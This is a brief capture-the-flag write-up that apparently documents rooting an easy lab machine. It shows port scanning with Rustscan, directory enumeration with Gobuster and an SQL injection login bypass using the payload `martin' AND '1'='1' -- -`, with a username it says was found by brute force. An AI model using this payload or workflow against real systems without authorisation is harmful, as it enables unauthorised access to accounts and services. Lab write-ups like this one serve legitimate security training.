- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

Root it.

# Recon
## Rustscan

Let's use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) to scan the open ports on the machine :

```
──(mdn0x㉿mdn0xKali)-[~]
└─$ rustscan -a 10.10.142.189 

         Open 10.10.142.189:22
         Open 10.10.142.189:80

```

# Enumeration
## Gobuster

We can now enumerate with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :

```
──(mdn0x㉿mdn0xKali)-[~]
└─$ gobuster dir -u 10.10.142.189 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

/manual               (Status: 301) [Size: 315] [--> http://10.10.142.189/manual/]

```

# Exploit

![a05d1ee2b423e3bc978f0e6e93839d28.png](../../2%20-%20Resources/Others/Flameshots/a05d1ee2b423e3bc978f0e6e93839d28.png)

We have a login page, let's try [SQL Injection](../../3%20-%20Tags/Hacking%20Concepts/SQL%20Injection.md) with a valid username (found with hydra) : `username: martin' AND '1'='1' -- - ; passw :asdf` :

<img src="../../2%20-%20Resources/Others/Flameshots/d11bdce304c0c86f761e2ac0e0e0033c.png" alt="d11bdce304c0c86f761e2ac0e0e0033c.png" width="583" height="533">

And we have the [Flag](../../3%20-%20Tags/Hacking%20Concepts/Flag.md) .

Pwned !!
